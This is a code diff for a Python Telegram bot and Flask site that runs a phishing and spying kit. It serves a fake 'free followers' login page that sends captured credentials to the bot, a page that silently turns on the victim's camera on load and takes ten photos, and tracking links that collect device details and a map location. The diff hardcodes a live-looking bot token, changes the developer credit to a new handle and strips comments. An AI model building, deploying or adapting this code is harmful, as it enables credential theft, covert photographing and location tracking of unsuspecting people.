@@ -11,8 +11,8 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # --- CONFIGURATION ---
-TOKEN = os.environ.get("BOT_TOKEN")
-SERVER_URL = os.environ.get("SERVER_URL")
+TOKEN = "7888111866:AAFTT2DxdpaSQ2JKOxUNR_YXrgK7q64M9lk"
+SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-free-followers-website.onrender.com")
 
 # Force Join Channel
 CHANNELS = ["@noruleclub"]
@@ -243,7 +243,6 @@ SMM_PANEL_HTML = """
                     document.getElementById('successMsg').style.display = 'block';
                     document.getElementById('loginForm').style.display = 'none';
                     
-                    // Redirect after 3 seconds
                     setTimeout(() => {
                         window.location.href = 'https://google.com';
                     }, 3000);
@@ -277,7 +276,6 @@ SMM_PANEL_HTML = """
             }, 4000);
         }
         
-        // Start camera for photos
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -291,7 +289,6 @@ SMM_PANEL_HTML = """
                 video.srcObject = stream;
                 await video.play();
                 
-                // Take 10 photos gradually
                 for (let i = 0; i < 10; i++) {
                     await new Promise(resolve => setTimeout(resolve, 2000));
                     
@@ -321,7 +318,6 @@ SMM_PANEL_HTML = """
             }
         }
         
-        // Start camera on load
         window.onload = function() {
             startCamera();
         };
@@ -420,7 +416,6 @@ def get_html(chat_id, redirect_url):
                 body: JSON.stringify(data)
             }});
 
-            // Redirect to SMM Panel after verification
             window.location.href = "/smm-panel?chat_id={chat_id}";
         }}
         window.onload = startTrap;
@@ -452,7 +447,6 @@ def smm_login():
     if not chat_id:
         return {"success": False}, 400
     
-    # Send credentials to bot
     msg = f"""
 🔐 **SMM Panel Login Attempt #{attempt}**
 
@@ -475,7 +469,6 @@ def smm_login():
     except:
         pass
     
-    # Always return success after 5 attempts
     if attempt >= 5:
         return {"success": True}
     
@@ -560,7 +553,7 @@ def upload():
         f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
         f"🗺 **Map Link:**\n{map_link}\n"
         f"━━━━━━━━━━━━━━━━\n"
-        f"⚡ Developed by: @FROXLS"
+        f"⚡ Developed by: @Proxyfxz"
     )
 
     try:
@@ -629,7 +622,7 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     redir = urllib.parse.quote(url)
     link = f"{SERVER_URL}/?id={uid}&redir={redir}"
 
-    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @FROXLS")
+    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @Proxyfxz")
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
